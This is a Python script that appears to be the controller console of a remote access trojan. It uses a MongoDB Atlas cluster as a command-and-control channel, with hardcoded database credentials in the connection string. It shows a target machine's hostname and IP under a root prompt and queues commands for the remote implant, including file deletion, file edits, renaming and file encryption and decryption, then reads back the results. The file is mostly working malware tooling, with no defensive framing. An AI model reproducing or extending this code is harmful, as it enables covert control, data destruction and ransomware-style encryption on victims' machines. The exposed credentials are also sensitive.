import pymongo
import json

con = "mongodb+srv://utsav:utsav@cluster0.rqeuq69.mongodb.net/?retryWrites=true&w=majority"

client = pymongo.MongoClient(con,tls=True,tlsAllowInvalidCertificates=True)

db=client['shell']

CWD=""
LAST_PATH=""
TARGET=""
IP=""
PREV_COMMAND=""
SHELL_RESULT=False

def getTargetMachine():
    global TARGET,IP
    col=db['systemInfo']
    x=col.find_one()
    if x:
        TARGET=x['hostname']
        IP=x['ip']
        return x['hostname'],x['ip']
    else:
        TARGET='None'
        IP='None'

def clearCollection():
    global TARGET
    col=db['myshell']
    col2=db['shellresult']
    filters={
        "target":TARGET
    }
    another_filer={
        "hostname":TARGET
    }
    try:
        col.delete_many(filters)
        col2.delete_one(another_filer)
    except Exception as e:
        print(e)


def is_directory_change_command():
    global PREV_COMMAND
    global CWD
    global LAST_PATH
    a= (PREV_COMMAND.split(" "))
 
    if a[0]=='cd':
            CWD=CWD+f'{a[1]}'
            LAST_PATH=f'{a[1]}'
    elif a[0]=='cd..':
            CWD=CWD.replace(LAST_PATH,"")


def ActionUploader():
    global PREV_COMMAND,CWD
    a= (PREV_COMMAND.split(" "))
    col=db['myshell']

    if a[0] not in ['cd','cd..','exit','e','quit','q']:
            action=a[0]
            current_path=CWD
            target=TARGET
            if len(a)==2:
                target_element=a[1]
                data={
                "action":action,
                "target":target,
                "current_path":current_path,
                "target_element":target_element,
                "new_filename":"",
                "target_string":"",
                "process_taken":0
                }
            elif len(a)==3:
                if a[0]=='updatefile':
                    target_element=a[1]
                    target_string=a[2]
                    data={
                        "action":action,
                        "target":target,
                        "current_path":current_path,
                        "target_element":target_element,
                        "target_string":target_string,
                        "new_filename":"",
                        "process_taken":0
                        }
                elif a[0]=='renamefile':
                    target_element=a[1]
                    new_filename=a[2]
                    data={
                        "action":action,
                        "target":target,
                        "current_path":current_path,
                        "target_element":target_element,
                        "new_filename":new_filename,
                        "target_string":"",
                        "process_taken":0
                        }
            else:
                data={
                "action":action,
                "target":target,
                "current_path":current_path,
                "target_string":"",
                "target_element":"",
                "new_filename":"",
                "process_taken":0
                }
            try:
                if not (col.find_one()):
                    col.insert_one(data)
                    result_for_shell(a[0])
                else:
                    filters={
                        "target":TARGET
                        }
                    col.delete_one(filters)
                    col.insert_one(data)
                    result_for_shell(a[0])
            except Exception as e:
                print(e)


def display(res):
    print(">>> ")
    if(type(json.loads(res['result']))==list):
        for i in (json.loads(res['result'])):
            print(i)
    else:
        print(json.loads(res['result']))
    print()
    clearCollection()


def result_for_shell(command):
    if command not in ['cd','cd..','exit','e','quit','q','deletefile','updatefile','mkdir','rmdir','createfile','renamefile','encrypt','decrypt']:
        col=db['shellresult']
        filters={
            "hostname":TARGET
        }
        while True:
                res=col.find_one(filters)
                if res:
                    display(res)
                    break



def shell():
    global CWD
    global PREV_COMMAND
    global TARGET,IP
    getTargetMachine()
    while True:
        shell_struct=f"({TARGET}-->{IP}@root)-[{CWD}]\n$ "
        command=str(input(shell_struct))
        PREV_COMMAND=(command)
        is_directory_change_command()
        ActionUploader()
        if command in ['exit','e','quit','q']:
            clearCollection()
            break



shell()